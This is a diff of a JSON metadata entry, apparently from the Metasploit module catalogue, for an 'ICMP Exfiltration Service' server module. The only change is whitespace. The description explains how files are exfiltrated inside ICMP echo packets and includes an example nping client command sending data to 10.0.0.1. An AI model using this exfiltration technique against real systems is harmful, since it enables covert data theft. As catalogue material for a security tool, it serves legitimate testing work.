@@ -1,20 +1,20 @@
 {
-  "name": "ICMP Exfiltration Service",
-  "fullname": "auxiliary/server/icmp_exfil",
-  "rank": 300,
-  "type": "auxiliary",
-  "author": [
-    "Chris John Riley"
-  ],
-  "description": "This module is designed to provide a server-side component to receive and store files\n        exfiltrated over ICMP echo request packets.\n\n        To use this module you will need to send an initial ICMP echo request containing the\n        specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or\n        a random filename can be assigned). All data received from this source will automatically\n        be added to the receive buffer until an ICMP echo request containing a specific end trigger\n        (defaults to '^EOL') is received.\n\n        Suggested Client:\n        Data can be sent from the client using a variety of tools. One such example is nping (included\n        with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string \"BOFtest.txt\" -c1",
-  "references": [
-    "URL-https://github.com/todb/packetfu",
-    "URL-https://nmap.org/book/nping-man.html",
-    "URL-https://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/"
-  ],
-  "mod_time": "2022-01-23 15:28:32 +0000",
-  "path": "/modules/auxiliary/server/icmp_exfil.rb",
-  "is_install_path": true,
-  "ref_name": "server/icmp_exfil",
-  "needs_cleanup": false
+	"name": "ICMP Exfiltration Service",
+	"fullname": "auxiliary/server/icmp_exfil",
+	"rank": 300,
+	"type": "auxiliary",
+	"author": [
+		"Chris John Riley"
+	],
+	"description": "This module is designed to provide a server-side component to receive and store files\n        exfiltrated over ICMP echo request packets.\n\n        To use this module you will need to send an initial ICMP echo request containing the\n        specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or\n        a random filename can be assigned). All data received from this source will automatically\n        be added to the receive buffer until an ICMP echo request containing a specific end trigger\n        (defaults to '^EOL') is received.\n\n        Suggested Client:\n        Data can be sent from the client using a variety of tools. One such example is nping (included\n        with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string \"BOFtest.txt\" -c1",
+	"references": [
+		"URL-https://github.com/todb/packetfu",
+		"URL-https://nmap.org/book/nping-man.html",
+		"URL-https://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/"
+	],
+	"mod_time": "2022-01-23 15:28:32 +0000",
+	"path": "/modules/auxiliary/server/icmp_exfil.rb",
+	"is_install_path": true,
+	"ref_name": "server/icmp_exfil",
+	"needs_cleanup": false
 }
